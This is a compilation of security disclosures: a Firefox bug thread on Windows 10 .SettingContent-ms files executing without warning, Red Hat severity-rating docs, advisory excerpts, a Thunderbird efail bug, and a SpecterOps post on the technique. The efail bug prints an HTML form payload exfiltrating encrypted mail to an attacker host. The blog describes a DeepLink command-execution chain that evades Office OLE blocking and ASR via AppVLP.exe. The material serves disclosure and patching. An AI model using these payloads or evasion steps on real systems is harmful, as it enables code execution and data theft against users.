User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36
Steps to reproduce:
Download attached SettingContent-ms file, or install attached extension for RCE.
Actual results:
SettingContent-ms is a new windows 10 extension that can be used to execute arbitrary local files with parameters.
Expected results:
Treat it as executable.
I am CCing Matt Nelson who originally found this file, I simply connected the dots with the browser RCE potential.
He wrote about this file in public <https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39>
Web Extension RCE part is not mentioned.

Bob, do you have any idea what we should do with this? It looks like it could be kind of Windows platform integration-y.Flags: needinfo?(bobowencode)

FWIW, this was reported to MSRC and they responded that the severity of the issue is below the bar for servicing and that the case will be closed.

I should be more clear, the "this" in the above comment was the .SettingContent-ms file format. The MS disclosure timeline is at the bottom of this post: <https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39>

Would also like to highlight an important part of the article Matt wrote (in case you didn't read it, worth a read tho!) - The mark of web is created for the file once downloaded with healthy content, but for some reason windows does not show any warning before executing. So this is a clean RCE requiring a single user click. (after installing malicious extension ofc)

The extension is calling browser.downloads.open, at which point the OS is up to protect you against arbitrary RCE. Microsoft is apparently considering this issue too low severity to fix. Now, we could either follow them and WONTFIX or we say that we consider this severe enough to add a blacklist of sorts to prevent opening this filetype via the downloads API.
In any case it seems to me like that decision should be made at the WebExtensions API level, so moving this to WebExtensions for now...Group: firefox-core-security → toolkit-core-securityComponent: Untriaged → WebExtensions: UntriagedProduct: Firefox → Toolkit

I thought we had a similar blacklist to what Windows does in terms of which files are executable, e.g. the stuff in $PATHEXT or whatever the env var is? I would expect us to warn for calling downloads.open() on this filetype in the same way as when a user clicks a download that would pop up the 'this file is executable, are you sure you want to run it' warning.
:paolo might know more about this too, but he's not accepting needinfo requests...

Attached patch

[The patch](attachment.cgi?id=8985901&action=diff)
— [Details](attachment.cgi?id=8985901&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1468217&attachment=8985901)

Adding "SettingContent-ms" to the list of executable file extensions solves the issue of the missing warning, both when opening from the Downloads Panel and from extension code.
In fact, we had other cases where Windows didn't warn before executing some file types even when they had the zone information, hence we now display our own warning dialog for every executable extension except "exe", even if it may be redundant.
The patch is straightforward and the general issue is public, so I've just stated what it does in the commit message, without any details on the steps to reproduce.
I already tested this with a local build that I ran on Windows 10. I believe it should be quite safe to land the patch in all branches, even at RC stage, so it may be already available to users in the release next week.Assignee: nobody → paolo.mozmailStatus: UNCONFIRMED → ASSIGNEDEver confirmed: trueFlags: needinfo?(paolo.mozmail)

The patch
Since this patch is quite straightforward, I'm already requesting the uplift flags so we can get this on the Release Management radar sooner. As mentioned in the previous comment, I think this is quite safe to land on all branches.
Let us know if you'd like us to land this on mozilla-central first, or just have the sheriffs land everywhere at the same time.
Approval Request Comment
[Feature/Bug causing the regression]: Recently announced security issue
[User impact if declined]: Code execution on the local machine without warning if an extension creates a file with a "SettingContent-ms" extension
[Is this code covered by automated tests?]: Not automatically testable, it effectively patches a Windows issue with a missing warning even if the file is correctly marked as having a remote source
[Has the fix been verified in Nightly?]: Yes, but only on one local build
[Needs manual test from QE? If yes, steps to reproduce]: Yes, using the proof of concept attached to this bug
[List of other uplifts needed for the feature/fix]: None
[Is the change risky?]: Very low risk
[Why is the change risky/not risky?]: This only affects the download and file opening code path, and we don't actually use this file extension for anything in the source tree anyways.
[String changes made/needed]: None
[If this is not a sec:{high,crit} bug, please state case for ESR consideration]: Improves security from code execution on the local machine with minimal risk.

This needs to get sec-approval first (or at least be assessed a sec rating of moderate or lower) before it can land. Also, we're about to build the RC of Fx61, so I'm a bit iffy about taking this at this point in the cycle.

Looks like AssocIsDangerous is what Explorer itself uses. Ironically it doesn't appear to pick up ".settingcontent-ms" when testing on my machine.

Dan/Al, can you rate this?
As filed, the webextensions side of things is limited to sec-moderate anyway, so then it wouldn't need sec-approval.
I don't think the "manual" download + open side of things is severe enough to be sec-high/sec-crit, but even if it is, given the time in the cycle we're at and the safety of the patch (1 entry addition to a list of file extensions), I think we should just land this on all branches in time for shipping 61.

So, to be really clear, I think this is about as safe a C++ patch as we're likely to see, and we should take it.Flags: needinfo?(dveditz)Flags: needinfo?(abillings)

This may be the reason why Windows Explorer does not warn about the file, as the documentation mentions that "ShellExecuteEx uses AssocIsDangerous to trigger zone checking".
Ideally we would have a way to serve additional entries in this list remotely using one of the already available mechanisms, or at least have the list defined in JavaScript so we could use a hotfix if necessary. We can also supplement the list using AssocIsDangerous, but it wouldn't handle cases like this bug.
While we're thinking about possible improvements, one thing I noticed is that the warning can be disabled globally and permanently using the checkbox. I think this ability should be removed, because it applies to every file type, not just the individual file being opened, and also applies to actions triggered by browser extensions. This is unclear from the current user interface, and there is no way to undo this action save from editing "about:config".Flags: needinfo?(paolo.mozmail)

Can you file bugs for these follow-ups? I think we should at least split off the webextensions usage from the 'normal' usage of the pref (ie prompt for the webext case even if the user turns off the prompt generally).

Yes, I planned to do this next week after the release.
For the checkbox, I can consider replacing it with two separate "about:config" settings, but if there is no way to undo the choice from "about:preferences" then I don't think we should have the checkbox in the first place. The equivalent Windows warnings can also only be disabled globally from the registry. We can also ask the UX team for an opinion on this. We should also not reuse the existing "about:config" setting just in case users disabled the warning accidentally, possibly years in the past.

In your case, the file was downloaded with a ".xml" extension, which depends on the content type of the attachment, which is "application/xml". Whether the extension is added or not may depend on the local configuration, but when it's added, there is no security issue because the file will not be executed by Windows.
The link Matt provided may solve this issue. If this doesn't you may have to set up a local HTTP server, which is what I did for testing.

This can be an issue with the build being tested not having the patch, the preference to disable the warning being accidentally enabled in the profile, or the WebExtensions API not going through the same code path as the newer versions.
If you can test the Downloads Panel flow there, this will tell us if we are in the latter scenario.Flags: needinfo?(paolo.mozmail)

Apparently not since the blog post was about getting Microsoft's star application to open these files, because it's not on the list they use either.

[bug 1369771](/show_bug.cgi?id=1369771 "VERIFIED FIXED - Confirm launching executable more often on Windows") looks like it would land pretty cleanly so I could support taking it. ESR-52 doesn't have WebExtensions, but without [bug 1369771](/show_bug.cgi?id=1369771 "VERIFIED FIXED - Confirm launching executable more often on Windows") the problem is arguably worse.Depends on: [1369771](/show_bug.cgi?id=1369771 "VERIFIED FIXED - Confirm launching executable more often on Windows")Flags: needinfo?(dveditz)

Regarding AssocIsDangerous, it’s a good API to use. I’m reaching out to MS to see if they will consider adding this file format, but if they do, it will probably only be in new Windows 10 builds.
Thanks for the quick response to this!!

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

Reporter
Abdulrahman Alqabandi
Impact
moderate
##### Description

Windows 10 does not warn users before opening executable files with the `SettingContent-ms` extension even when they have been downloaded from the internet and have the "Mark of the Web." Without the warning, unsuspecting users unfamiliar with this new file type might run an unwanted executable. This also allows a WebExtension with the limited `downloads.open` permission to execute arbitrary code without user interaction on Windows 10 systems
*Note: this issue only affects Windows operating systems. Other operating systems are unaffected.*

Impact
critical
##### Description

Mozilla developers and community members Alex Gaynor, Christoph Diehl, Christian Holler, Jason Kratzer, David Major, Jon Coppeard, Nicolas B. Pierron, Jason Kratzer, Marcia Knous, and Ronald Crane reported memory safety bugs present in Firefox 60, Firefox ESR 60, Firefox ESR 52.8, and Thunderbird 52.8. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

[poc-efail-bypass-enter](attachment.cgi?id=8979029)
— [Details](attachment.cgi?id=8979029&action=edit)

One exfiltration method to exploit the efail vuln is to build a form with a textarea tag that contains an encrypted mail part.
However Thunderbird tries to prevent sending forms with data. Until Thunderbird 52.7.0 it was possible to send a form with a <buttom type="submit">. This was fixed in 52.8.0.
I found however another bypass that still works in 52.8.0 and that allows to send the form content with minor user interaction (actually, the user has to press "Enter" once).
A form can not only be sent by clicking, but also by pressing enter within a text input field.
So in order to exfiltrate an attacker can have a first HTML part like this:
<form action="https://[attackerhost]" method="GET">
<input type=text name="aa" value="press enter" autofocus>
<textarea name="bb">
Then comes the encrypted MIME part and then just a
</textarea></form>
to close the tags as the last mail part.
The autofocus makes sure after opening the mail the cursor is already in the text field. Pressing enter will cause a GET request that passes the whole content of the encrypted part to [attackerhost].
Obviously it's possible to try to redesign the mail in order to increase the chance to get an Enter press from the user. E.g. one can hide the textarea (opacity:0) and maybe think of plausible things to display that may cause a user to press enter.
In terms of better fixes, I believe allowing HTML forms to exist within HTML mails is a risky thing to begin with. Ideally I'd propose to filter out all form-related HTML tags before rendering a mail.
Apart from that I believe different parts of a mail shouldn't be rendered within one HTML context. (Though I heard that TB is already working on changing this.)
Furthermore I think it should be considered not allowing half-encrypted mails at all. Encryption should be an "all or nothing", i.e. displaying a mix of encrypted and unencrypted content seems inherently risky.

I think the correct solution is really to ship TB with the patches of [bug 1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails").

Thanks for filing. That's a way to submit we should also disable.
Should fix this, even if it's only a minor problem now (after [bug 1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")) that parts are parsed separately.Assignee: nobody → mkmelin+mozillaSeverity: critical → normalFlags: needinfo?(mkmelin+mozilla)

No, not really. [Bug 1462473](/show_bug.cgi?id=1462473 "RESOLVED DUPLICATE - [efail] Bypassing 58.7.0 <form> mitigation") was about sending a form with a <button> element. This has been fixed in 52.8.
This one is about sending a form by pressing enter in a focused field. I think this is a separate issue that should be handled. It seems the intended goal of Thunderbird to not allow data to be send with HTML forms in mails, thus all bypasses should be fixed.

It's not, just that it's a minor issue now: No data leak, but you could potentially trick someone to fill in some personal detail within a mail and submit to an obscure site.

Hmm, that can be written as:
if (e.target.ownerDocument == sourceDoc)
e.preventDefault();
Can you please explain what sourceDoc and e.target.ownerDocument could be and give some examples.

1. Is there another way to fix this, by disallowing forms in the DocShell with nsIDocShell parameters?
2. Can you hook up the listener only for the message content pane? instead of the entire mail frontend window? For example, you have a msgWindow reference just a few lines above. Would be nice to be even more specific and hook it up only for the message content pane (not headers).

I'm adding the SANDBOXED\_FORMS flag: "This flag blocks form submission."
<https://dxr.mozilla.org/comm-central/rev/9055d9d89a4bca5cf48dda789299559aefca4e54/mozilla/dom/base/nsSandboxFlags.h#59>
I believe it's primary use is to implement the CSP sandbox directive for webpages.
It makes trying to submit a form do nothing.

You can still use it as a test case for if form submission is working or not, which is this bug. Just open the mail, notice you're autofocused in the input, press enter, and notice nothing happens.
If it's not working you'll get sent to <https://q2.re/f.php?aa=press+enter>.......
But if you accidentally just click the input instead, you'll get sent to <https://q2.re/f.php> without any parameters.

Right, with the patch nothing happens, without it, the website opens in the external browser.
> But if you accidentally just click the input instead, you'll get sent to
> <https://q2.re/f.php> without any parameters.
Right, that's still the case, even with the patch. Is that intentional?

Yes, that's intentional. So that the user would not do anything with the form inside the mail, we send them to the form action url. Reasonably that should allow them to fill in. In case it actually is something legit. But then they can at least see which domain they are on and take normal precautions.

As an attacker, initial access can prove to be quite the challenge against a hardened target. When selecting a payload for initial access, an attacker has to select a file format that allows arbitrary code execution or shell command execution with minimal user interaction. These file formats can be sparse, which is why attackers have relied on file types like .HTAs, Office macros, .VBS, .JS, etc. There are obviously a finite number of built-in file extensions on Windows, and as defenses improve, the number of effective payloads continues to shrink.

Additionally, an attacker has to get that file to the end user in a way that will result in execution. Again, options for this can be limited as directly linking to payloads or attaching them to emails tend to get blocked by antivirus or browser protections. This is why attackers have resorted to Object Linking and Embedding (OLE), ZIP files, etc. To combat the file delivery vector, Office 2016 introduced [blocking all of the “dangerous” file formats](https://support.office.com/en-us/article/Packager-Activation-in-Office-2016-52808039-4A7C-4550-BE3A-869DD338D834) from being embedded via OLE by default. This reduces the effectiveness of one of the most relied upon payload delivery methods. When trying to activate a blocked file extension, Office will throw an error and prevent execution:

![]()

Office 2016 blocking one of many “dangerous” file extensions

In addition to OLE blocking, Microsoft also introduced [Attack Surface Reduction (ASR) rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard) into Windows 10 (which requires Windows Defender AV as a dependency). The purpose of these rules are to reduce the functionality that an attacker can abuse or exploit to obtain code-execution on the system. One of the most touted and effective ASR rules is “Block Office applications from creating child processes”. This rule will block any attempt to spawn a process as a child of an Office application:

![]()

Attack Surface Reduction Rules blocking Office child processes

When you combine OLE blocking and ASR together, the options to execute code on an endpoint from the internet become a little more limited. Most useful file types can’t be delivered via OLE per the new block in Office 2016, and ASR’s child process creation rule prevents any instances of a child process spawning under an Office application.

How could we circumvent these controls? I first decided to tackle the file format problem. I spent a lot of hours going through the registry looking for new file formats that might allow execution. Most of these formats can be found in the root of the HKCR:\ registry hive. The process involved pulling all of the registered file formats out and then looking at them to see if the format itself allowed for anything interesting.

After countless hours reading file specifications, I stumbled across the “.SettingContent-ms” file type. This format was introduced in Windows 10 and allows a user to create “shortcuts” to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries. An example .SettingContent-ms file will look like this:

![]()

Normal SettingContent-ms file for the Windows Control Panel

All this file does is open the Control Panel for the user. The interesting aspect of this file is the **<DeepLink>** element in the schema. This element takes any binary with parameters and executes it. What happens if we simply substitute “control.exe” to something like “cmd.exe /c calc.exe”?

![]()

Replacing the <DeepLink> element with an attacker controlled value

Then if we double-click the file:

![]()

Execution of the modified SettingContent-ms file

What is interesting is that when double-clicking the file, there is no “open” prompt. Windows goes straight to executing the command.

Great! So we have a file format that allows shell command execution via a file open. This solves the “what file format to use” problem of initial access. Now, how can we deliver it? My next thought was to see what happens if this file comes straight from the internet via a link.

Execution of a SettingContent-ms file directly from the internet via a hyperlink

Yikes!! When this file comes straight from the internet, it executes as soon as the user clicks “open”. Looking at the streams of the file, you will notice that it does indeed grab [Mark-Of-The-Web](https://help.madcapsoftware.com/flare2018/Content/Flare/Targets/More/Adding-MOTW.htm):

![]()

The MOTW ADS being applied to the downloaded

When looking up the [ZoneIds online](https://blogs.msdn.microsoft.com/oldnewthing/20131104-00/?p=2753), “3” equals “URLZONE\_INTERNET”. For one reason or another, the file still executes without any notification or warning to the user.

So, we now have a file type that allows arbitrary shell command execution and displays zero warnings or dialogues to the user. When trying to get initial access, going across a target’s perimeter with an unusual file type can be risky. Ideally, this file would be placed in a container of a more common file type, such as an Office document.

As mentioned before, Office 2016 blocks a preset list of “known bad” file types when embedded with [Object Linking and Embedding](https://enigma0x3.net/2016/03/15/phishing-with-empire/). The SettingContent-ms file format, however, is not included in [that list](https://support.office.com/en-us/article/Packager-Activation-in-Office-2016-52808039-4A7C-4550-BE3A-869DD338D834):

![]()

Office 2016 OLE block list not blocking the SettingContent-ms file

At this point, we can evade the Office 2016 OLE file extension block by embedding a malicious .SettingContent-ms file via OLE:

![]()

Office 2016 OLE block list not blocking the SettingContent-ms file

When a document comes from the internet with a .SettingContent-ms file embedded in it, the only thing the user sees is the “Open Package Contents” prompt. Clicking “Open” will result in execution. If an environment doesn’t have any Attack Surface Reduction rules enabled, this is all an attacker needs to execute code on the endpoint. I was curious, so I poked at how this holds up with ASR’s child process creation rules enabled. **It is also worth noting that at of the time of this post, ASR rules do not appear to work on Office if Office was installed from the Windows Store.**

[Enabling these rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction) is pretty simple, and can be done with one PowerShell command: “Set-MpPreference -AttackSurfaceReductionRules\_Ids <rule ID> -AttackSurfaceReductionRules\_Actions Enabled”

The <rule ID> parameter is the GUID of the rule you want to enabled. You can find the GUID for each ASR rule documented [here](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard). For this test, I want to enable the Child Process Creation rule, which is GUID D4F940AB-401B-4EFC-AADC-AD5F3C50688A.

After enabling the rule, the attack no longer works:

![]()

Attack Surface Reduction rule blocking SettingContent-ms execution

Since the rule is designed to block child processes from being spawned from an Office application, our payload executed, but the rule blocked the command. This got me thinking into how ASR achieves that without breaking some functionality. I first started to just test random binaries in random paths to see if ASR was blocking based on the image path. This was quite time consuming and didn’t get me very far.

I ended up taking a step back and thinking about what parts of Office have to work. After running ProcMon and looking at Process Explorer for a little bit while clicking around in Word, I noticed that there were still child processes being spawned by Word.

![]()

Valid child process creation of Word

This makes sense, as Office needs to use features that rely on other programs. I thought that maybe the ASR rule blocks child processes based on image path, but images in the Office path are allowed to be spawned when features are activated.

To test this theory, I changed my .SettingContent-ms file to the path of “Excel.exe”:

![]()

Changing the <DeepLink> element to Excel.exe

The next step is to embed this new file into a Word document and see if ASR blocks “Excel.exe” from being spawned.

![]()

Excel spawning under winword via modified SettingContent-ms file

Interestingly enough, ASR allows Excel to start. So the child process creation ASR rule appears to be making decisions based on whitelisted paths.

This sent me down a long, long path of trying to find a binary I could use that existed in the path “C:\Program Files\Microsoft Office”. After going through a few of them and passing “C:\Windows\System32\cmd.exe” to them as a parameter on the command line, one of them kicked:

![]()

Execution of commands via ASR whitelisted “AppVLP.exe”

Perfect! We are able to abuse “AppVLP” to execute shell commands. Normally, this binary is used for Application Virtualization, but we can use it as an abuse binary to circumvent the ASR file path rule. To test this full chain, I updated my .SettingContent-ms file to look like this:

![]()

Final OLE/ASR evasion payload

Now, the file just needs embedded into an Office document and executed:

![]()

Evading the OLE block with .SettingContent-ms and ASR with AppVLP.exe

As you can see, with Office 2016’s OLE block rule and ASR’s Child Process Creation rule enabled, .SettingContent-ms files combined with “AppVLP.exe” in the Office folder allow us to circumvent these controls and execute arbitrary commands.

While Office documents are often marked with MOTW and are opened in the [Protected View Sandbox](https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653), there are file formats that allow OLE and aren’t triggered by the Protected View sandbox. You can find more on that [here](/phishing-against-protected-view-enigma0x3-on-wordpress-com-eed399fca512).

**Wrap Up:**

After looking into ASR and the new file formats in Windows 10, I realized that it is important to try and audit new binaries and file types that get added in each release of Windows. In this case, the .SettingContent-ms extension can allow an attacker to run arbitrary commands on the latest version of Windows while evading ASR and Office 2016 OLE blocks. Additionally, the file type appears to give execution (even from the internet) immediately after it’s opened, despite having the MOTW applied.

**Defenses:**

Great, so what can you do about it? Ultimately, a .SettingContent-ms file should not be executing anywhere outside of the “C:\Windows\ImmersiveControlPanel” path. Additionally, since the file format only allows for executing shell commands, anything being run through that file is subject to command line logging.

It is also a good idea to always monitor child process creations from Office applications. There are a few applications that should be spawning under the Office applications, so monitoring for outliers can be useful. One tool that can accomplish this is [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).

Another option is to neuter the file format by killing its handler. I have **NOT** tested this extensively and can offer no guarantee that something within Windows won’t break by doing this. For those who want to play around with the implications of killing the handler to the .SettingContent-ms file format, you can set the “DelegateExecute” key in “HKCR:\SettingContent\Shell\Open\Command” to be empty. Again, this might break functionality on the OS, so proceed with caution.

You can find a PoC SettingContent-ms file here: <https://gist.github.com/enigma0x3/b948b81717fd6b72e0a4baca033e07f8>

**Reporting timeline:**

As committed as SpecterOps is to transparency ([https://posts.specterops.io/a-push-toward-transparency-c385a0dd1e34](/a-push-toward-transparency-c385a0dd1e34)), we acknowledge the rate at which attackers adopt new offensive techniques once they are made public. This is why prior to publicization of a new offensive technique, we regularly inform the respective vendor of the issue, supply ample time to mitigate the issue, and notify select, trusted vendors in order to ensure detections can be delivered to their customers as quickly as possible.

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when script uses mutation events to move DOM nodes between documents, resulting in the old document that held the node being freed but the node still having a pointer referencing it. This results in a potentially exploitable crash.

Reporter
David Black
Impact
high
##### Description

NPAPI plugins, such as Adobe Flash, can send non-simple cross-origin requests, bypassing CORS by making a same-origin POST that does a 307 redirect to the target site. This allows for a malicious site to engage in cross-site request forgery (CSRF) attacks.

Reporter
Abdulrahman Alqabandi
Impact
moderate
##### Description

Windows 10 does not warn users before opening executable files with the `SettingContent-ms` extension even when they have been downloaded from the internet and have the "Mark of the Web." Without the warning, unsuspecting users unfamiliar with this new file type might run an unwanted executable. This also allows a WebExtension with the limited `downloads.open` permission to execute arbitrary code without user interaction on Windows 10 systems
*Note: this issue only affects Windows operating systems. Other operating systems are unaffected.*

Impact
critical
##### Description

Mozilla developers and community members Alex Gaynor, Christoph Diehl, Christian Holler, Jason Kratzer, David Major, Jon Coppeard, Nicolas B. Pierron, Jason Kratzer, Marcia Knous, and Ronald Crane reported memory safety bugs present in Firefox 60, Firefox ESR 60, Firefox ESR 52.8, and Thunderbird 52.8. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 17.10](/security/notices?release=artful)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

bypass CORS restrictions, obtain sensitive information, or execute

arbitrary code. ([CVE-2018-12359](/security/CVE-2018-12359), [CVE-2018-12360](/security/CVE-2018-12360), [CVE-2018-12362](/security/CVE-2018-12362),

